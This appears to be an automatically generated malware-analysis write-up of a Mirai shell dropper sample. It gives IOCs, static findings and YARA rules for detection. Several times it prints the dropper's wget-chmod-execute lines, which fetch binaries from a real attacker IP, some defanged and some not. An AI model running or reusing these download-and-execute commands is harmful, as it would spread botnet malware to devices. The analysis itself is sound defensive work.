# Storytime: Dissecting a Mirai SH dropper

> **Source:** [MalwareBazaar](https://bazaar.abuse.ch/sample/8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9/) · **SHA-256** `8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9` · **Family** `Mirai` · **Static analysis only — the sample was never run.**

## The Story

It showed up on MalwareBazaar as a 391-byte `sh` file, tagged `Mirai`. We pulled exactly one copy into quarantine, cracked open the password-protected archive, and read the bytes as inert text. Nothing here was executed — every claim below comes from reading the code, not running it. Here is what it was hiding.

## First Contact — The Code As It Arrived

Straight out of the archive, a portion of the sample looks like this (defanged):

```shell
cd /var
rm arm* mips mipsel
wget hxxp://217[.]60[.]195[.]160/gigatex/arm; chmod 777 arm; ./arm gentech
wget hxxp://217[.]60[.]195[.]160/gigatex/arm5; chmod 777 arm5; ./arm5 gentech
wget hxxp://217[.]60[.]195[.]160/gigatex/arm7; chmod 777 arm7; ./arm7 gentech
wget hxxp://217[.]60[.]195[.]160/gigatex/mips; chmod 777 mips; ./mips gentech
wget hxxp://217[.]60[.]195[.]160/gigatex/mipsel; chmod 777 mipsel; ./mipsel gentech
```

## What It Wants To Do

The behaviour that matters, recovered from the (deobfuscated) code: `shell_dropper`. It pulls follow-on payloads down with a shell download tool, makes them executable, and launches them — a classic drop-and-run loader.

## Executive Summary

One MalwareBazaar submission, analyzed statically — never executed, loaded, imported, or dynamically tested. Static evidence produced 9 IOCs and 2 code/string findings.

## What The Agent Did

1. Pulled recent MalwareBazaar metadata.
2. Selected one unprocessed or source-preferred candidate.
3. Downloaded only that sample's password-protected ZIP into quarantine.
4. Read one archived member into memory for static analysis.
5. Calculated hashes, entropy, file magic, printable strings, IOCs, and suspicious code/string patterns.
6. Generated this technical blog, structured JSON, IOC JSON, YARA, and a verifier prompt.

## Sample Identity

| Field | Value |
|---|---|
| MalwareBazaar SHA-256 | `8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9` |
| Analyzed SHA-256 | `8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9` |
| Family label | `Mirai` |
| File name | `giga.sh` |
| Archived member | `8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9.sh` |
| File type | `sh` |
| First seen | `2026-06-21 14:45:34` |
| Tags | `Mirai, sh` |

## Static Triage

| Property | Value |
|---|---:|
| Bytes analyzed | 391 |
| Entropy | 4.675 |
| Printable strings | 7 |
| File magic | `63 64 20 2f 76 61 72 0a` |

## IOCs

| Type | Value |
|---|---|
| MD5 | `41b45aefd3f0a8e04abe7fd3a632ed94` |
| SHA-1 | `d0eddc89079aeac09b7894ddfbf41275d7189848` |
| SHA-256 | `8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9` |
| URL | `http://217.60.195.160/gigatex/arm` |
| URL | `http://217.60.195.160/gigatex/arm5` |
| URL | `http://217.60.195.160/gigatex/arm7` |
| URL | `http://217.60.195.160/gigatex/mips` |
| URL | `http://217.60.195.160/gigatex/mipsel` |
| IP | `217.60.195.160` |

## Static Findings

| Severity | Category | Evidence | Detail |
|---|---|---|---|
| high | shell_dropper | `\bwget\b` | Matched 5 occurrence(s) |
| high | shell_dropper | `\bchmod\s+(?:\+x|777|755)` | Matched 5 occurrence(s) |

## Selected Strings

These strings were selected because they contain network indicators or suspicious execution markers.

| String |
|---|
| `wget http://217.60.195.160/gigatex/arm; chmod 777 arm; ./arm gentech` |
| `wget http://217.60.195.160/gigatex/arm5; chmod 777 arm5; ./arm5 gentech` |
| `wget http://217.60.195.160/gigatex/arm7; chmod 777 arm7; ./arm7 gentech` |
| `wget http://217.60.195.160/gigatex/mips; chmod 777 mips; ./mips gentech` |
| `wget http://217.60.195.160/gigatex/mipsel; chmod 777 mipsel; ./mipsel gentech` |

## What We've Learned So Far

How this sample sits against everything the loop has analyzed before:

- Corpus before this sample: **1** prior sample(s).
- First time the loop has seen the `Mirai` family.
- No overlap with earlier samples yet — this one expands the knowledge base.


## YARA Rules

The first rule combines an exact SHA-256 condition with selected static strings. The second rule is generated from static source/string findings.

```yara
import "hash"

rule Single_Sample_Static_8985fe09d5b08240
{
  meta:
    source = "loop-engineering single-sample static analysis"
    analysis = "static only; sample not executed"
    sha256 = "8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9"
    md5 = "41b45aefd3f0a8e04abe7fd3a632ed94"
    sha1 = "d0eddc89079aeac09b7894ddfbf41275d7189848"
    file_magic = "63 64 20 2f 76 61 72 0a"
    malwarebazaar_family = "Mirai"
  strings:
    $s01 = "wget http://217.60.195.160/gigatex/arm; chmod 777 arm; ./arm gentech" nocase
    $s02 = "wget http://217.60.195.160/gigatex/arm5; chmod 777 arm5; ./arm5 gentech" nocase
    $s03 = "wget http://217.60.195.160/gigatex/arm7; chmod 777 arm7; ./arm7 gentech" nocase
    $s04 = "wget http://217.60.195.160/gigatex/mips; chmod 777 mips; ./mips gentech" nocase
    $s05 = "wget http://217.60.195.160/gigatex/mipsel; chmod 777 mipsel; ./mipsel gentech" nocase
  condition:
    hash.sha256(0, filesize) == "8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9" or 2 of ($s*)
}

rule Static_Source_Malware_Indicators
{
  meta:
    source = "loop-engineering static source analysis"
    language_hint = "shell"
    analysis = "static text only; sample not executed"
  strings:
    $url_01 = "http://217.60.195.160/gigatex/arm" nocase
    $url_02 = "http://217.60.195.160/gigatex/arm5" nocase
    $url_03 = "http://217.60.195.160/gigatex/arm7" nocase
    $url_04 = "http://217.60.195.160/gigatex/mips" nocase
    $url_05 = "http://217.60.195.160/gigatex/mipsel" nocase
    $ip_06 = "217.60.195.160" nocase
  condition:
    any of them
}
```

## Analyst Assessment

MalwareBazaar labels this sample as `Mirai`, so triage should start with that family context. Static strings expose network indicators that can support enrichment and hunting. High-severity static patterns were found, especially execution or script-loading indicators.

## Verification Notes

- A second agent should verify that the blog claims are supported by `analysis.json` and `sample.yar`.
- No dynamic behavior should be asserted unless a future static source analysis produces supporting evidence.
- The raw sample ZIP remains in `quarantine/` and must not be committed.
